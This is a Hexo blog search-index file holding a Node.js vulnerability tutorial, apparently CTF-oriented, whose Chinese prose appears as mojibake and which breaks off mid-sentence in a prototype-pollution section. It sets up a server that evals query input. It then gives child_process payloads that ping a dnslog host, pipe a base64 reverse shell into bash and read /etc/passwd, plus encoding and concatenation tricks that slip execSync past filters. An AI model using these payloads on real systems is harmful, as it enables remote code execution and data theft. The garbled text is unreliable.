<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nodejsæ¼æ´æ€»ç»“</title>
      <link href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Nodejsè¯­è¨€ç‰¹æ€§"><a href="#Nodejsè¯­è¨€ç‰¹æ€§" class="headerlink" title="Nodejsè¯­è¨€ç‰¹æ€§"></a>Nodejsè¯­è¨€ç‰¹æ€§</h1><h2 id="å¤§å°å†™ç‰¹æ€§"><a href="#å¤§å°å†™ç‰¹æ€§" class="headerlink" title="å¤§å°å†™ç‰¹æ€§"></a>å¤§å°å†™ç‰¹æ€§</h2><pre><code class="plsql">toUpperCase()toLowerCase()</code></pre><p> å¯¹äºtoUpperCase(): å­—ç¬¦â€Ä±â€ã€â€Å¿â€ ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º â€œIâ€ã€â€Sâ€<br>å¯¹äºtoLowerCase(): å­—ç¬¦â€Kâ€ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸ºâ€kâ€(è¿™ä¸ªKä¸æ˜¯K)  </p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><h3 id="å¤§å°æ¯”è¾ƒ"><a href="#å¤§å°æ¯”è¾ƒ" class="headerlink" title="å¤§å°æ¯”è¾ƒ"></a>å¤§å°æ¯”è¾ƒ</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.log(&#39;asd&#39;&gt;1); //false</code></pre><p> æ€»ç»“ï¼šæ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šä¼˜å…ˆå°†çº¯æ•°å­—å‹å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼›è€Œå­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦è½¬ä¸ºASCIIç ä¹‹åå†è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤å°±ä¼šå‡ºç°ç¬¬äº”è¡Œä»£ç çš„è¿™ç§æƒ…å†µï¼›è€Œéæ•°å­—å‹å­—ç¬¦ä¸²ä¸ä»»ä½•æ•°å­—è¿›è¡Œæ¯”è¾ƒéƒ½æ˜¯false  </p><h3 id="æ•°ç»„æ¯”è¾ƒ"><a href="#æ•°ç»„æ¯”è¾ƒ" class="headerlink" title="æ•°ç»„æ¯”è¾ƒ"></a>æ•°ç»„æ¯”è¾ƒ</h3><pre><code class="plsql">console.log([]==[]); //false console.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //true console.log([100,2]&lt;&#39;test&#39;); //true console.log([1,2]&lt;&#39;2&#39;);  //true console.log([11,16]&lt;&quot;10&quot;); //false</code></pre><p> æ€»ç»“ï¼šç©ºæ•°ç»„ä¹‹é—´æ¯”è¾ƒæ°¸è¿œä¸ºfalseï¼Œæ•°ç»„ä¹‹é—´æ¯”è¾ƒåªæ¯”è¾ƒæ•°ç»„é—´çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œå¯¹ç¬¬ä¸€ä¸ªå€¼é‡‡ç”¨å‰é¢æ€»ç»“çš„æ¯”è¾ƒæ–¹æ³•ï¼Œæ•°ç»„ä¸éæ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ•°ç»„æ°¸è¿œå°äºéæ•°å€¼å‹å­—ç¬¦ä¸²ï¼›æ•°ç»„ä¸æ•°å€¼å‹å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå–ç¬¬ä¸€ä¸ªä¹‹åæŒ‰å‰é¢æ€»ç»“çš„æ–¹æ³•è¿›è¡Œæ¯”è¾ƒ  </p><h3 id="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"><a href="#è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š" class="headerlink" title="è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š"></a>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š</h3><pre><code class="plsql">console.log(null==undefined) // è¾“å‡ºï¼štrue console.log(null===undefined) // è¾“å‡ºï¼šfalse console.log(NaN==NaN)  // è¾“å‡ºï¼šfalse console.log(NaN===NaN)  // è¾“å‡ºï¼šfalse</code></pre><h2 id="å˜é‡æ‹¼æ¥ï¼š"><a href="#å˜é‡æ‹¼æ¥ï¼š" class="headerlink" title="å˜é‡æ‹¼æ¥ï¼š"></a>å˜é‡æ‹¼æ¥ï¼š</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56 console.log(&quot;5&quot;+[6,6]); //56,6 console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</code></pre><h2 id="MD5çš„ç»•è¿‡"><a href="#MD5çš„ç»•è¿‡" class="headerlink" title="MD5çš„ç»•è¿‡"></a>MD5çš„ç»•è¿‡</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code></pre><p>a[x]=1&amp;b[x]=2<br>æ•°ç»„ä¼šè¢«è§£ææˆ**[object Object]      **</p><pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) a=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p><h2 id="ES6æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#ES6æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="ES6æ¨¡æ¿å­—ç¬¦ä¸²"></a>ES6æ¨¡æ¿å­—ç¬¦ä¸²</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå¼•å·æ›¿ä»£æ‹¬å·æ‰§è¡Œå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ›¿ä»£å•å¼•å·åŒå¼•å·ï¼Œå¯ä»¥åœ¨åå¼•å·å†…æ’å…¥å˜é‡ã€‚<br>ä½†æ˜¯æœ‰ä¸€ç‚¹æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œæ¨¡æ¿å­—ç¬¦ä¸²æ˜¯å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°ä¸­ï¼Œè€Œå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æ•°ç»„é‡åˆ°${}æ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè¢«åˆ†å‰²ã€‚</p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log(&quot;hello %s&quot;,yake);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log`hello$&#123;yake&#125;world`;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><h3 id="16è¿›åˆ¶ç¼–ç "><a href="#16è¿›åˆ¶ç¼–ç " class="headerlink" title="16è¿›åˆ¶ç¼–ç "></a>16è¿›åˆ¶ç¼–ç </h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></pre><h3 id="unicodeç¼–ç "><a href="#unicodeç¼–ç " class="headerlink" title="unicodeç¼–ç "></a>unicodeç¼–ç </h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></pre><h3 id="baseç¼–ç "><a href="#baseç¼–ç " class="headerlink" title="baseç¼–ç "></a>baseç¼–ç </h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></pre><h1 id="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</h1><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript çš„ eval ä½œç”¨å°±æ˜¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„ js ä»£ç ã€‚  </p><pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //æ‰§è¡Œdocument.cookieconsole.log(&quot;document.cookie&quot;); //è¾“å‡ºdocument.cookie</code></pre><p><strong>æˆ‘ä»¬æ¥æ­å»ºä¸€ä¸ªæœåŠ¡æµ‹è¯•ä¸€ä¸‹</strong></p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/&#39;,function(req,res)&#123;    res.send(eval(req.query.a));console.log(req.query.a);&#125;)app.listen(1234);console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);</code></pre><p> Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br><strong>1.exec()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸spawn()ä¸åŒçš„æ˜¯å…¶æ¥å£ä¸åŒï¼Œå®ƒæœ‰ä¸€ä¸ªå›è°ƒå‡½æ•°è·çŸ¥å­è¿›ç¨‹çš„çŠ¶å†µã€‚å®é™…ä½¿ç”¨å¯ä»¥ä¸åŠ å›è°ƒå‡½æ•°ã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>æˆ‘ä»¬å¯ä»¥è¿›è¡Œåå¼¹shellçš„æ“ä½œ:</strong></p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)</code></pre><p>PSï¼šå¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require(ç±»ä¼¼äºCode-Breaking 2018 Thejs)ï¼Œ<br>åˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load(â€˜child_processâ€™).exec(â€˜calcâ€™)æ¥æ‰§è¡Œå‘½ä»¤</p><p><strong>2.spawn()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ã€‚spawn (å‘½ä»¤ï¼Œ{shell:true})ã€‚éœ€è¦å¼€å¯å‘½ä»¤æ‰§è¡Œçš„æŒ‡ä»¤ã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> ä¸spawn()ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºå®ƒåˆ›å»ºNodeçš„å­è¿›ç¨‹åªéœ€æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptæ–‡ä»¶æ¨¡å—å³å¯ã€‚ç”¨äºæ‰§è¡Œ js æ–‡ä»¶ï¼Œå®é™…åˆ©ç”¨ä¸­éœ€è¦æå‰å†™å…¥æ¶æ„æ–‡ä»¶  </p><pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);</code></pre><p>æ­¤æ—¶æ˜¯å‡è®¾æˆ‘ä»¬å·²ç»ä¸Šä¼ äº†evil.jsæ–‡åŒ–,æˆ‘ä»¬å°±å¯ä»¥ç”¨forkå»æ‰§è¡Œ<br>å¦‚æˆ‘ä»¬åœ¨evil.jsä¸­ä»£ç å¦‚ä¸‹:</p><pre><code class="plsql">console.log(&quot;hello hacker&quot;);</code></pre><p>æˆ‘ä»¬æ­¤æ—¶è®¿é—®è¿™ä¸ªç½‘ç«™</p><pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);</code></pre><p>å¦‚å›¾ï¼Œå‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œäº†<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> å¯åŠ¨ä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®é™…åˆ©ç”¨æ—¶ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä½ç½®æ‰§è¡Œ shell å‘½ä»¤ï¼Œç±»ä¼¼ execã€‚  </p><pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>æ³¨æ„ç‚¹:</strong></p><ol><li>**<em>spawn()ä¸exec()ã€execFile()ä¸åŒçš„æ˜¯ï¼Œåä¸¤è€…åˆ›å»ºæ—¶å¯ä»¥æŒ‡å®štimeoutå±æ€§</em>**ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œ ä¸€æ—¦åˆ›å»ºçš„è¿›ç¨‹è¿è¡Œè¶…è¿‡è®¾å®šçš„æ—¶é—´å°†ä¼šè¢«æ€æ­»ã€‚</li><li>exec()ä¸execFile()ä¸åŒçš„æ˜¯ï¼Œ**<em>exec()é€‚åˆæ‰§è¡Œå·²æœ‰çš„å‘½ä»¤ï¼ŒexecFile()é€‚åˆæ‰§è¡Œæ–‡ä»¶</em>**ã€‚</li></ol><p><strong>åé¢å‡ ä¸ªå‡½æ•°çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯è°ƒç”¨ä¸Šè¿°ä»‹ç»çš„å››ç§æ–¹æ³•,è¿™é‡Œå°±ä¸å†èµ˜è¿°!</strong></p><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)ï¼Œè¯¥å‡½æ•°ä½œç”¨æ˜¯ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼Œfunction å¤„ä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setTimeout(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æ¯ä¸ªä¸¤ç§’æ‰§è¡Œä¸€æ¬¡ä»£ç ã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setInterval(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()ï¼Œstring æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œçš„ function ç”¨æ³•ç±»ä¼¼äº php é‡Œçš„ create_functionã€‚  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();var server = app.listen(1234,function()&#123;    console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h2 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h2><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œé‚£è‡ªç„¶å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„å¢åˆ æ”¹æŸ¥ã€‚<br>æ“ä½œå‡½æ•°åé¢æœ‰Syncä»£è¡¨åŒæ­¥æ–¹æ³•</p><blockquote><p>Node.js æ–‡ä»¶ç³»ç»Ÿï¼ˆfs æ¨¡å—ï¼‰æ¨¡å—ä¸­çš„æ–¹æ³•å‡æœ‰å¼‚æ­¥å’ŒåŒæ­¥ç‰ˆæœ¬ï¼Œä¾‹å¦‚è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°æœ‰å¼‚æ­¥çš„ fs.readFile() å’ŒåŒæ­¥çš„ fs.readFileSync()ã€‚<br>å¼‚æ­¥çš„æ–¹æ³•å‡½æ•°æœ€åä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«äº†é”™è¯¯ä¿¡æ¯(error)ã€‚<br>å»ºè®®å¤§å®¶ä½¿ç”¨å¼‚æ­¥æ–¹æ³•ï¼Œæ¯”èµ·åŒæ­¥ï¼Œå¼‚æ­¥æ–¹æ³•æ€§èƒ½æ›´é«˜ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”æ²¡æœ‰é˜»å¡ã€‚</p></blockquote><p><strong>è¯»</strong><br>readFile()</p><pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);</code></pre><p> readFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)</code></pre><p>readdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()</code></pre><p>rmdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()</code></pre><p><strong>å†™</strong><br> writeFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);</code></pre><p> writeFile()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)</code></pre><h2 id="nodejså±é™©å‡½æ•°-RCE-bypass"><a href="#nodejså±é™©å‡½æ•°-RCE-bypass" class="headerlink" title="nodejså±é™©å‡½æ•°-RCE bypass"></a>nodejså±é™©å‡½æ•°-RCE bypass</h2><p> åŸå‹:</p><pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)</code></pre><h3 id="å­—ç¬¦æ‹¼æ¥"><a href="#å­—ç¬¦æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æ‹¼æ¥"></a>å­—ç¬¦æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2bå°±æ˜¯+çš„urlç¼–ç ) require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</code></pre><h3 id="ç¼–ç ç»•è¿‡-1"><a href="#ç¼–ç ç»•è¿‡-1" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //å¼¹è®¡ç®—å™¨</code></pre><h3 id="æ¨¡æ¿æ‹¼æ¥"><a href="#æ¨¡æ¿æ‹¼æ¥" class="headerlink" title="æ¨¡æ¿æ‹¼æ¥"></a>æ¨¡æ¿æ‹¼æ¥</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;ï¼‰</code></pre><h3 id="å…¶ä»–å‡½æ•°"><a href="#å…¶ä»–å‡½æ•°" class="headerlink" title="å…¶ä»–å‡½æ•°"></a>å…¶ä»–å‡½æ•°</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</code></pre><h1 id="nodejs-åŸå‹é“¾æ±¡æŸ“"><a href="#nodejs-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="nodejs-åŸå‹é“¾æ±¡æŸ“"></a>nodejs-åŸå‹é“¾æ±¡æŸ“</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“è¿™å‡ ç‚¹:<br> 1.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚  </p><pre><code class="plsql">object.prototype.name=value</code></pre><p> 2.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š  </p><pre><code class="html">objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p> 3.ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š  </p><pre><code class="html">var o = &#123;a: 1&#125;;// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype// åŸå‹é“¾ï¼š// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype// åŸå‹é“¾ï¼š// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype// åŸå‹é“¾ï¼š// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>çŸ¥é“äº†ä»¥ä¸Šä¸‰ç‚¹ä»¥åï¼Œæˆ‘ä»¬æ¥ä»‹ç»å¦‚ä½•è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p> å¯¹äºè¯­å¥ï¼šobject[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º__proto__ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚<br> æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:  </p><pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>æœ€ç»ˆè¾“å‡ºäº†ä¸¤ä¸ªhello word<br>ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº† 